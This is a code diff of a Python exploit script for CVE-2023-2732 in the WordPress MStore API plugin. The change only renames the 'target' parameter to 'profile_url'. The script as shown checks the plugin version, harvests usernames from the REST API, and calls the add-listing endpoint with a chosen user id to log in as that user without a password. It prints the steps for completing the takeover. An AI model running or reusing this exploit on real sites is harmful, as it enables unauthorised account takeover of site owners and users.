@@ -8,9 +8,9 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 session = requests.Session()
 
-def version_check(target):
+def version_check(profile_url):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
-    plugin_url = f"{target}/wp-content/plugins/mstore-api/readme.txt"
+    plugin_url = f"{profile_url}/wp-content/plugins/mstore-api/readme.txt"
     
     print("[•] Checking plugin version from readme.txt...")
     
@@ -36,7 +36,7 @@ def version_check(target):
                 return False
         else:
             print("[•] Failed to fetch readme.txt file, checking via wp-json API...")
-            response = session.get(f"{target}/wp-json/", headers=headers, verify=False, timeout=30)
+            response = session.get(f"{profile_url}/wp-json/", headers=headers, verify=False, timeout=30)
             if "add-listing" in response.text and "get-nearby-listings" in response.text:
                 print("[•] The plugin might be installed, but we couldn't verify the version. Proceeding with exploit...")
                 return True
@@ -47,12 +47,12 @@ def version_check(target):
         print(f"[•] Error checking plugin version: {e}")
         return False
 
-def fetch_users_from_rest_api(target):
+def fetch_users_from_rest_api(profile_url):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Edge/16.16299'}
     print("[•] Fetching usernames via the REST API...")
     
     try:
-        response = session.get(f"{target}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
+        response = session.get(f"{profile_url}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
         
         if response.status_code == 200:
             users = response.json()
@@ -81,9 +81,9 @@ def prompt_user_selection(users):
         print("[•] Invalid user ID selected.")
         return None
 
-def attempt_login_as_user(target, user_id, username):
+def attempt_login_as_user(profile_url, user_id, username):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
-    exploit_url = f"{target}/wp-json/wp/v2/add-listing?id={user_id}"
+    exploit_url = f"{profile_url}/wp-json/wp/v2/add-listing?id={user_id}"
 
     print(f"[•] Attempting to authenticate as user '{username}' using the exploit...")
     
@@ -95,7 +95,7 @@ def attempt_login_as_user(target, user_id, username):
             print("\n[•] Vulnerable system found!")
             print("[•] Exploit Steps:")
             print(f"    1. Visit the following URL to trigger the exploit: {exploit_url}")
-            print(f"    2. Visit {target} to be logged in as '{username}'.")
+            print(f"    2. Visit {profile_url} to be logged in as '{username}'.")
         elif response.status_code == 403 and "cf-cookie-error" in response.text:
             print("[•] Cloudflare is blocking the exploit attempt.")
         else:
@@ -105,12 +105,12 @@ def attempt_login_as_user(target, user_id, username):
     except Exception as e:
         print(f"[•] Error during exploit attempt: {e}")
 
-def scan_cve_2023_2732(target):
-    if not version_check(target):
+def scan_cve_2023_2732(profile_url):
+    if not version_check(profile_url):
         print("[•] Target is not vulnerable or version check failed.")
         return
 
-    users = fetch_users_from_rest_api(target)
+    users = fetch_users_from_rest_api(profile_url)
     if not users:
         print("[•] No users found or failed to retrieve user list.")
         return
@@ -120,4 +120,4 @@ def scan_cve_2023_2732(target):
         print("[•] No valid user selected.")
         return
 
-    attempt_login_as_user(target, selected_user['id'], selected_user['name'])
+    attempt_login_as_user(profile_url, selected_user['id'], selected_user['name'])
